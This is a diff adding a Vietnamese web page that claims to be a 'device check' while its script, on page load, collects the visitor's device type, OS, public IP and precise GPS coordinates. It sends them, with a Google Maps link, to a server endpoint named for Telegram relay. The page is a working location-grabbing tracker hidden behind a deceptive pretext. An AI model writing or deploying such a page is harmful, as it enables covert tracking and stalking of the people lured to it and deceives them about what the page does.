@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <title>Kiểm tra thiết bị</title>
+</head>
+<body>
+  <h3>Đang kiểm tra thiết bị, vui lòng chờ...</h3>
+  <script>
+    const info = {
+      time: new Date().toLocaleString(),
+      device: '',
+      os: '',
+      ip: '',
+      realIp: '',
+      lat: '',
+      lon: '',
+    };
+
+    function detectDevice() {
+      const ua = navigator.userAgent;
+      if (/iPhone|iPad|iPod/i.test(ua)) {
+        info.device = 'iOS Device';
+        info.os = 'iOS';
+      } else if (/Android/i.test(ua)) {
+        const match = ua.match(/Android.*; (.+?) Build/);
+        info.device = match ? match[1] : 'Android Device';
+        info.os = 'Android';
+      } else if (/Windows NT/i.test(ua)) {
+        info.device = 'Windows PC';
+        info.os = 'Windows';
+      } else if (/Macintosh/i.test(ua)) {
+        info.device = 'Mac';
+        info.os = 'macOS';
+      } else {
+        info.device = 'Không xác định';
+        info.os = 'Không rõ';
+      }
+    }
+
+    async function getPublicIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        info.ip = data.ip || 'Không rõ';
+      } catch {
+        info.ip = 'Không rõ';
+      }
+    }
+
+    async function getRealIP() {
+      try {
+        const res = await fetch('https://icanhazip.com');
+        info.realIp = (await res.text()).trim();
+      } catch {
+        info.realIp = 'Không rõ';
+      }
+    }
+
+    async function getLocation() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) {
+          resolve();
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(pos => {
+          info.lat = pos.coords.latitude.toFixed(6);
+          info.lon = pos.coords.longitude.toFixed(6);
+          resolve();
+        }, () => resolve(), { enableHighAccuracy: true, timeout: 8000 });
+      });
+    }
+
+    function getCaption() {
+      const mapsLink = info.lat && info.lon
+        ? `https://maps.google.com/?q=${info.lat},${info.lon}`
+        : 'Không rõ';
+      return `
+🕒 Thời gian: ${info.time}
+📱 Thiết bị: ${info.device}
+🖥️ Hệ điều hành: ${info.os}
+🌍 IP dân cư: ${info.ip}
+🧠 IP gốc: ${info.realIp}
+📍 Google Maps: ${mapsLink}
+      `.trim();
+    }
+
+    async function sendToServer() {
+      const text = getCaption();
+      await fetch('/api/sendTelegram', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ message: text })
+      });
+    }
+
+    async function main() {
+      detectDevice();
+      await getPublicIP();
+      await getRealIP();
+      await getLocation();
+      await sendToServer();
+    }
+
+    main();
+  </script>
+</body>
+</html>
